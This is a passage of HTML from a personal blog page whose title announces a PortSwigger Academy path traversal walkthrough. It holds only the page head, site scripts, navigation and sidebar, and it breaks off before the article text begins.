<!DOCTYPE html><html class="transition bg-[var(--page-bg)] md:text-[16px] text-[14px]" data-astro-cid-sckkx6r4 data-overlayscrollbars-initialize lang=en style=--bannerOffset:15vh;--banner-height-home:65vh;--banner-height:35vh;--configHue:250;--page-width:75rem><head><title>PortSwigger Academy - Path traversal. - .:: Alan Cortez</title><meta charset=UTF-8><meta content="PortSwigger Academy - Path traversal. - .:: Alan Cortez" name=description><meta content="Alan Cortez" name=author><meta content=".:: Alan Cortez" property=og:site_name><meta content=https://alan.com.ar/posts/portswiggeracademypathtraversal/ property=og:url><meta content="PortSwigger Academy - Path traversal. - .:: Alan Cortez" property=og:title><meta content="PortSwigger Academy - Path traversal. - .:: Alan Cortez" property=og:description><meta content=article property=og:type><meta content=summary_large_image name=twitter:card><meta content=https://alan.com.ar/posts/portswiggeracademypathtraversal/ property=twitter:url><meta content="PortSwigger Academy - Path traversal. - .:: Alan Cortez" name=twitter:title><meta content="PortSwigger Academy - Path traversal. - .:: Alan Cortez" name=twitter:description><meta content="width=device-width" name=viewport><meta content="Astro v5.6.1" name=generator><link href=/favicon/icon.png rel=icon><script>!function(){switch(localStorage.getItem("theme")||"dark"){case"light":document.documentElement.classList.remove("dark");break;case"dark":document.documentElement.classList.add("dark");break;case"auto":window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")}const e=localStorage.getItem("hue")||250;document.documentElement.style.setProperty("--hue",e);let t=Math.floor(.3*window.innerHeight);t-=t%4,document.documentElement.style.setProperty("--banner-height-extend",`${t}px`)}()</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"PortSwigger Academy - Path traversal.","description":"PortSwigger Academy - Path traversal.","keywords":["Cybersecurity","BURP","portswigger","Walkthrough"],"author":{"@type":"Person","name":"Alan Cortez","url":"https://alan.com.ar/"},"datePublished":"09/07/2025","inLanguage":"en"}</script><link href=https://alan.com.ar/rss.xml rel=alternate title="Alan Cortez" type=application/rss+xml><link href=/_astro/Layout.BuewHHUq.css rel=stylesheet><link href=/_astro/Layout.DSulWsr7.css rel=stylesheet><link href=/_astro/_page_.C1JAO1eL.css rel=stylesheet><link href=/_astro/about.BtniRLn_.css rel=stylesheet><link href=/_astro/_page_.piZE0xNc.css rel=stylesheet><style>input.svelte-1gu5h8y:focus{outline:0}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex){-webkit-appearance:none;height:1.5rem;background-image:var(--color-selection-bar);transition:background-image .15s ease-in-out}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-webkit-slider-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-webkit-slider-thumb:hover{background:#fffc}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-webkit-slider-thumb:active{background:#fff9}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-moz-range-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;border-width:0;background:#ffffffb3;box-shadow:none}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-moz-range-thumb:hover{background:#fffc}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-moz-range-thumb:active{background:#fff9}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-ms-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-ms-thumb:hover{background:#fffc}#display-setting.svelte-1s19bex input[type=range]:where(.svelte-1s19bex)::-ms-thumb:active{background:#fff9}</style><script type=module src=/_astro/page.DMlPhIQx.js></script></head><body class="transition min-h-screen" data-astro-cid-sckkx6r4 data-overlayscrollbars-initialize style=--bannerOffset:15vh;--banner-height-home:65vh;--banner-height:35vh;--configHue:250;--page-width:75rem><div id=config-carrier data-hue=250></div><div class="mx-auto relative max-w-[var(--page-width)] duration-700 md:px-4 pointer-events-none px-0 transition-all z-50" id=top-row><div class="transition-all sticky pointer-events-auto top-0" id=navbar-wrapper><div class="onload-animation z-50" id=navbar><div class="transition absolute -top-8 bg-[var(--card-bg)] h-8 left-0 right-0"></div><div class="mx-auto max-w-[var(--page-width)] !overflow-visible !rounded-t-none card-base flex h-[4.5rem] items-center justify-between px-4"><a href=/ class="rounded-lg font-bold active:scale-95 btn-plain px-5 scale-animation h-[3.25rem]"><div class="text-[var(--primary)] flex items-center flex-row text-md"><svg data-icon=material-symbols:home-outline-rounded height=1em width=1em class="mb-1 mr-2 text-[1.75rem]"><symbol id=ai:material-symbols:home-outline-rounded viewBox="0 0 24 24"><path d="M6 19h3v-5q0-.425.288-.712T10 13h4q.425 0 .713.288T15 14v5h3v-9l-6-4.5L6 10zm-2 0v-9q0-.475.213-.9t.587-.7l6-4.5q.525-.4 1.2-.4t1.2.4l6 4.5q.375.275.588.7T20 10v9q0 .825-.588 1.413T18 21h-4q-.425 0-.712-.288T13 20v-5h-2v5q0 .425-.288.713T10 21H6q-.825 0-1.412-.587T4 19m8-6.75" fill=currentColor /></symbol><use href=#ai:material-symbols:home-outline-rounded></use></svg> .:: Alan Cortez</div></a><div class="hidden md:flex"><a href=/ class="rounded-lg font-bold active:scale-95 btn-plain px-5 scale-animation h-11" aria-label=Home><div class="flex items-center">Home</div></a><a href=/archive/ class="rounded-lg font-bold active:scale-95 btn-plain px-5 scale-animation h-11" aria-label=Archive><div class="flex items-center">Archive</div></a><a href=https://bookshelf.alan.com.ar class="rounded-lg font-bold active:scale-95 btn-plain px-5 scale-animation h-11" aria-label="Currently Reading" target=_blank><div class="flex items-center">Currently Reading <svg data-icon=fa6-solid:arrow-up-right-from-square height=1em width=1em class="transition -translate-y-[1px] dark:text-white/[0.2] ml-1 text-[0.875rem] text-black/[0.2]"><symbol id=ai:fa6-solid:arrow-up-right-from-square viewBox="0 0 512 512"><path d="M320 0c-17.7 0-32 14.3-32 32s14.3 32 32 32h82.7L201.4 265.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L448 109.3V192c0 17.7 14.3 32 32 32s32-14.3 32-32V32c0-17.7-14.3-32-32-32zM80 32C35.8 32 0 67.8 0 112v320c0 44.2 35.8 80 80 80h320c44.2 0 80-35.8 80-80V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v112c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h112c17.7 0 32-14.3 32-32s-14.3-32-32-32z" fill=currentColor /></symbol><use href=#ai:fa6-solid:arrow-up-right-from-square></use></svg></div></a></div><div class=flex><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(self.Astro||(self.Astro={})).only=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:only")),(()=>{var t=Object.defineProperty,e=(e,r,n)=>((e,r,n)=>r in e?t(e,r,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[r]=n)(e,"symbol"!=typeof r?r+"":r,n);{let t={0:t=>s(t),1:t=>n(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(n(t)),5:t=>new Set(n(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},r=e=>{let[r,n]=e;return r in t?t[r](n):void 0},n=t=>t.map(r),s=t=>"object"!=typeof t||null===t?t:Object.fromEntries(Object.entries(t).map((([t,e])=>[t,r(e)])));class i extends HTMLElement{constructor(){super(...arguments),e(this,"Component"),e(this,"hydrator"),e(this,"hydrate",(async()=>{var t;if(!this.hydrator||!this.isConnected)return;let e=null==(t=this.parentElement)?void 0:t.closest("astro-island[ssr]");if(e)return void e.addEventListener("astro:hydrate",this.hydrate,{once:!0});let r,n=this.querySelectorAll("astro-slot"),i={},o=this.querySelectorAll("template[data-astro-template]");for(let t of o){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("data-astro-template")||"default"]=t.innerHTML,t.remove())}for(let t of n){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("name")||"default"]=t.innerHTML)}try{r=this.hasAttribute("props")?s(JSON.parse(this.getAttribute("props"))):{}}catch(t){let e=this.getAttribute("component-url")||"<unknown>",r=this.getAttribute("component-export");throw r&&(e+=` (export ${r})`),console.error(`[hydrate] Error parsing props for component ${e}`,this.getAttribute("props"),t),t}await this.hydrator(this)(this.Component,r,i,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))})),e(this,"unmount",(()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))}))}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(this.hasAttribute("await-children")&&"interactive"!==document.readyState&&"complete"!==document.readyState){let t=()=>{document.removeEventListener("DOMContentLoaded",t),e.disconnect(),this.childrenConnectedCallback()},e=new MutationObserver((()=>{var e;(null==(e=this.lastChild)?void 0:e.nodeType)===Node.COMMENT_NODE&&"astro:end"===this.lastChild.nodeValue&&(this.lastChild.remove(),t())}));e.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",t)}else this.childrenConnectedCallback()}async childrenConnectedCallback(){let t=this.getAttribute("before-hydration-url");t&&await import(t),this.start()}async start(){let t=JSON.parse(this.getAttribute("opts")),e=this.getAttribute("client");if(void 0!==Astro[e])try{await Astro[e]((async()=>{let t=this.getAttribute("renderer-url"),[e,{default:r}]=await Promise.all([import(this.getAttribute("component-url")),t?import(t):()=>()=>{}]),n=this.getAttribute("component-export")||"default";if(n.includes(".")){this.Component=e;for(let t of n.split("."))this.Component=this.Component[t]}else this.Component=e[n];return this.hydrator=r,this.hydrate}),t,this)}catch(t){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,t)}else window.addEventListener(`astro:${e}`,(()=>this.start()),{once:!0})}attributeChangedCallback(){this.hydrate()}}e(i,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",i)}})()</script><astro-island client=only component-export=default component-url=/_astro/Search.DpBf4QgH.js opts={&quot;name&quot;:&quot;Search&quot;,&quot;value&quot;:&quot;svelte&quot;} props={} renderer-url=/_astro/client.svelte.D5_oNBmh.js ssr uid=1M5RnG></astro-island><astro-island client=only component-export=default component-url=/_astro/LightDarkSwitch.jzhJGwwh.js opts={&quot;name&quot;:&quot;LightDarkSwitch&quot;,&quot;value&quot;:&quot;svelte&quot;} props={} renderer-url=/_astro/client.svelte.D5_oNBmh.js ssr uid=ZmY6Vl></astro-island><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 md:!hidden w-11" aria-label=Menu id=nav-menu-switch name="Nav Menu"><svg data-icon=material-symbols:menu-rounded height=1em width=1em class=text-[1.25rem]><symbol id=ai:material-symbols:menu-rounded viewBox="0 0 24 24"><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h16q.425 0 .713.288T21 17t-.288.713T20 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use href=#ai:material-symbols:menu-rounded></use></svg></button></div><div class="absolute transition-all fixed float-panel float-panel-closed px-2 py-2 right-4" id=nav-menu-panel><a href=/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Home</div><svg data-icon=material-symbols:chevron-right-rounded height=1em width=1em class="transition text-[1.25rem] text-[var(--primary)]"><symbol id=ai:material-symbols:chevron-right-rounded viewBox="0 0 24 24"><path d="M12.6 12L8.7 8.1q-.275-.275-.275-.7t.275-.7t.7-.275t.7.275l4.6 4.6q.15.15.213.325t.062.375t-.062.375t-.213.325l-4.6 4.6q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7z" fill=currentColor /></symbol><use href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/archive/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Archive</div><svg data-icon=material-symbols:chevron-right-rounded height=1em width=1em class="transition text-[1.25rem] text-[var(--primary)]" viewBox="0 0 24 24"><use href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=https://bookshelf.alan.com.ar class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2" target=_blank><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Currently Reading</div><svg data-icon=fa6-solid:arrow-up-right-from-square height=1em width=1em class="transition -translate-x-1 dark:text-white/25 text-[0.75rem] text-black/25" viewBox="0 0 512 512"><use href=#ai:fa6-solid:arrow-up-right-from-square></use></svg></a></div><astro-island client=only component-export=default component-url=/_astro/DisplaySettings.DFk83_sk.js opts={&quot;name&quot;:&quot;DisplaySettings&quot;,&quot;value&quot;:&quot;svelte&quot;} props={} renderer-url=/_astro/client.svelte.D5_oNBmh.js ssr uid=1gE8tQ></astro-island></div></div><script type=module>function c(){"dark"===localStorage.theme?(document.documentElement.classList.remove("dark"),localStorage.theme="light"):(document.documentElement.classList.add("dark"),localStorage.theme="dark")}function o(){let e=document.getElementById("scheme-switch");e&&(e.onclick=function(){c()});let t=document.getElementById("display-settings-switch");t&&(t.onclick=function(){let e=document.getElementById("display-setting");e&&e.classList.toggle("float-panel-closed")});let n=document.getElementById("nav-menu-switch");n&&(n.onclick=function(){let e=document.getElementById("nav-menu-panel");e&&e.classList.toggle("float-panel-closed")})}o()</script><script>!async function(){const i=await import("/pagefind/pagefind.js");await i.options({excerptLength:20}),i.init(),window.pagefind=i,i.search("")}()</script></div></div><div class="w-full absolute pointer-events-none z-30" style=top:5.5rem><div class="mx-auto relative max-w-[var(--page-width)] pointer-events-auto"><div class="transition w-full duration-700 gap-4 grid grid-cols-[17.5rem_auto] grid-rows-[auto_1fr_auto] left-0 lg:grid-rows-[auto] md:px-4 mx-auto px-0 right-0" id=main-grid><div class="w-full col-span-2 lg:col-span-1 lg:max-w-[17.5rem] lg:row-end-2 lg:row-start-1 mb-4 onload-animation row-end-3 row-start-2" id=sidebar><div class="w-full flex gap-4 flex-col mb-4"><div class="p-3 card-base"><a href=/ class="overflow-hidden active:scale-95 block group lg:max-w-none lg:mt-0 lg:mx-0 max-w-[12rem] mb-3 mt-1 mx-auto relative rounded-xl" aria-label="Go to About Page"><div class="transition flex items-center justify-center absolute group-active:bg-black/50 group-hover:bg-black/30 h-full pointer-events-none w-full z-50"><svg data-icon=material-symbols:home height=1em width=1em class="transition group-hover:opacity-100 group-hover:scale-100 opacity-0 scale-90 text-5xl text-white"><symbol id=ai:material-symbols:home viewBox="0 0 24 24"><path d="M4 21V9l8-6l8 6v12h-6v-7h-4v7z" fill=currentColor /></symbol><use href=#ai:material-symbols:home></use></svg></div><div class="overflow-hidden relative lg:mt-0 mx-auto h-full lg:w-full"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img src=/profile/demo-avatar.gif style=object-position:center alt="Profile Image of the Author" class="w-full h-full object-cover"></div></a><div class=px-2><div class="transition font-bold dark:text-neutral-50 mb-1 text-center text-xl">Alan Cortez</div><div class="transition mb-2 bg-[var(--primary)] h-1 mx-auto rounded-full w-5"></div><div class="transition text-center mb-2.5 text-neutral-400">Bits of <u><a href=/archive/tag/Walkthrough/ >Cyber Security</a></u>, <u><a href=/archive/tag/scripts/ >Coding</a></u>, <u><a href="/archive/tag/Age Of Empires II/">Age Of Empires II</a></u> and <u><a href=/archive/tag/Project/ >small projects</a></u>.</div><div class="mb-1 flex gap-2 justify-center"><a href=https://github.com/athekat class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=GitHub target=_blank rel=me><svg data-icon=fa6-brands:github height=1em width=0.97em class=text-[1.5rem]><symbol id=ai:fa6-brands:github viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6c-3.3.3-5.6-1.3-5.6-3.6c0-2 2.3-3.6 5.2-3.6c3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9c2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9c.3 2 2.9 3.3 5.9 2.6c2.9-.7 4.9-2.6 4.6-4.6c-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2c12.8 2.3 17.3-5.6 17.3-12.1c0-6.2-.3-40.4-.3-61.4c0 0-70 15-84.7-29.8c0 0-11.4-29.1-27.8-36.6c0 0-22.9-15.7 1.6-15.4c0 0 24.9 2 38.6 25.8c21.9 38.6 58.6 27.5 72.9 20.9c2.3-16 8.8-27.1 16-33.7c-55.9-6.2-112.3-14.3-112.3-110.5c0-27.5 7.6-41.3 23.6-58.9c-2.6-6.5-11.1-33.3 2.6-67.9c20.9-6.5 69 27 69 27c20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27c13.7 34.7 5.2 61.4 2.6 67.9c16 17.7 25.8 31.5 25.8 58.9c0 96.5-58.9 104.2-114.8 110.5c9.2 7.9 17 22.9 17 46.4c0 33.7-.3 75.4-.3 83.6c0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252C496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2c1.6 1.6 3.9 2.3 5.2 1c1.3-1 1-3.3-.7-5.2c-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9c1.6 1 3.6.7 4.3-.7c.7-1.3-.3-2.9-2.3-3.9c-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2c2.3 2.3 5.2 2.6 6.5 1c1.3-1.3.7-4.3-1.3-6.2c-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2c-1.4-2.3-4-3.3-5.6-2" fill=currentColor /></symbol><use href=#ai:fa6-brands:github></use></svg> </a><a href=mailto:blog@alan.com.ar class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Email target=_blank rel=me><svg data-icon=material-symbols:mail height=1em width=1em class=text-[1.5rem]><symbol id=ai:material-symbols:mail viewBox="0 0 24 24"><path d="M4 20q-.825 0-1.412-.587T2 18V6q0-.825.588-1.412T4 4h16q.825 0 1.413.588T22 6v12q0 .825-.587 1.413T20 20zm8-7l8-5V6l-8 5l-8-5v2z" fill=currentColor /></symbol><use href=#ai:material-symbols:mail></use></svg></a></div></div></div></div><div class="w-full flex gap-4 flex-col mb-4 items-center justify-center"><a href=https://tryhackme.com/r/p/athekat><img src=https://tryhackme-badges.s3.amazonaws.com/athekat.png style=border-radius:1rem alt="TryHackMe Badge"></a></div><div class="w-full flex gap-4 flex-col mb-4 items-center justify-center"><img src=/profile/Untitled.webp style=border-radius:1rem></div><div class="w-full flex gap-4 flex-col top-4 top-4 duration-700 sticky transition-all" id=sidebar-sticky><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve=true data-id=tags data-is-collapsed=true style=animation-delay:.2s;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Tags</div><div class="overflow-hidden collapse-wrapper collapsed px-4" id=tags style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><div class="flex-wrap flex gap-2"><a href="/archive/tag/Age Of Empires II/" class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Age Of Empires II tag">Age Of Empires II </a><a href=/archive/tag/AI/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the AI tag">AI </a><a href=/archive/tag/Algokit/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Algokit tag">Algokit </a><a href=/archive/tag/Algorand/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Algorand tag">Algorand </a><a href=/archive/tag/Angular/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Angular tag">Angular </a><a href=/archive/tag/Blockchain/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Blockchain tag">Blockchain </a><a href=/archive/tag/Blog/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Blog tag">Blog </a><a href=/archive/tag/Bluesky/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Bluesky tag">Bluesky </a><a href=/archive/tag/Bot/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Bot tag">Bot </a><a href=/archive/tag/BURP/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the BURP tag">BURP </a><a href=/archive/tag/CC/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the CC tag">CC </a><a href=/archive/tag/Certification/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Certification tag">Certification </a><a href=/archive/tag/Challenge/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Challenge tag">Challenge </a><a href=/archive/tag/cryptocurrencies/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the cryptocurrencies tag">cryptocurrencies </a><a href=/archive/tag/CSS/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the CSS tag">CSS </a><a href=/archive/tag/ctf/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the ctf tag">ctf </a><a href=/archive/tag/Cybersecurity/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Cybersecurity tag">Cybersecurity </a><a href=/archive/tag/Data/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Data tag">Data </a><a href=/archive/tag/Django/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Django tag">Django </a><a href=/archive/tag/Docker/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Docker tag">Docker </a><a href=/archive/tag/Ebooks/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Ebooks tag">Ebooks </a><a href=/archive/tag/HackTheBox/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the HackTheBox tag">HackTheBox </a><a href=/archive/tag/Homebrew/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Homebrew tag">Homebrew </a><a href=/archive/tag/HTML/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the HTML tag">HTML </a><a href=/archive/tag/Hugo/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Hugo tag">Hugo </a><a href=/archive/tag/ISC2/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the ISC2 tag">ISC2 </a><a href=/archive/tag/Modding/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Modding tag">Modding </a><a href=/archive/tag/Playstation/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Playstation tag">Playstation </a><a href=/archive/tag/portswigger/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the portswigger tag">portswigger </a><a href=/archive/tag/PostgreSQL/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the PostgreSQL tag">PostgreSQL </a><a href=/archive/tag/Project/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Project tag">Project </a><a href=/archive/tag/Ps2/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Ps2 tag">Ps2 </a><a href=/archive/tag/Purevolume/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Purevolume tag">Purevolume </a><a href=/archive/tag/Python/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Python tag">Python </a><a href=/archive/tag/R/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the R tag">R </a><a href=/archive/tag/scripts/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the scripts tag">scripts </a><a href=/archive/tag/SOC/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the SOC tag">SOC </a><a href=/archive/tag/Telegram/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Telegram tag">Telegram </a><a href=/archive/tag/TryHackMe/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the TryHackMe tag">TryHackMe </a><a href=/archive/tag/Walkthrough/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Walkthrough tag">Walkthrough </a><a href=/archive/tag/Website/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Website tag">Website </a><a href=/archive/tag/Windows/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Windows tag">Windows</a></div></div><div class="px-4 -mb-2 expand-btn" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><button class="rounded-lg btn-plain h-9 w-full" data-astro-cid-ucso7hve style=--collapsedHeight:7.5rem><div class="text-[var(--primary)] flex items-center -translate-x-2 gap-2 justify-center" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><svg data-icon=material-symbols:more-horiz height=1em width=1em class=text-[1.75rem] data-astro-cid-ucso7hve=true><symbol id=ai:material-symbols:more-horiz viewBox="0 0 24 24"><path d="M6 14q-.825 0-1.412-.587T4 12t.588-1.412T6 10t1.413.588T8 12t-.587 1.413T6 14m6 0q-.825 0-1.412-.587T10 12t.588-1.412T12 10t1.413.588T14 12t-.587 1.413T12 14m6 0q-.825 0-1.412-.587T16 12t.588-1.412T18 10t1.413.588T20 12t-.587 1.413T18 14" fill=currentColor /></symbol><use href=#ai:material-symbols:more-horiz></use></svg> More</div></button></div></widget-layout><script type=module>class d extends HTMLElement{constructor(){if(super(),"true"!==this.dataset.isCollapsed)return;const e=this.dataset.id,t=this.querySelector(".expand-btn"),s=this.querySelector(`#${e}`);t.addEventListener("click",(()=>{s.classList.remove("collapsed"),t.classList.add("hidden")}))}}customElements.get("widget-layout")||customElements.define("widget-layout",d)</script></div></div><main class="overflow-hidden col-span-2 lg:col-span-1 transition-swup-fade" id=swup-container><div class=onload-animation id=content-wrapper><div class="w-full flex relative mb-4 overflow-hidden rounded-[var(--radius-large)]"><div class="w-full relative card-base md:px-9 pb-4 pt-6 px-6 z-10" id=post-container><div class="transition flex dark:text-white/30 flex-row gap-5 mb-3 onload-animation text-black/30"><div class="flex-row flex items-center"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:notes-rounded height=1em width=1em><symbol id=ai:material-symbols:notes-rounded viewBox="0 0 24 24"><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use href=#ai:material-symbols:notes-rounded></use></svg></div><div class=text-sm>1230 words</div></div><div class="flex-row flex items-center"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:schedule-outline-rounded height=1em width=1em><symbol id=ai:material-symbols:schedule-outline-rounded viewBox="0 0 24 24"><path d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20" fill=currentColor /></symbol><use href=#ai:material-symbols:schedule-outline-rounded></use></svg></div><div class=text-sm>6 minutes</div></div></div><div class="onload-animation relative"><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-5 before:left-[-1.125rem] before:top-[0.75rem] block dark:text-white/90 mb-3 md:before:w-1 md:text-[2.25rem]/[2.75rem] text-3xl text-black/90 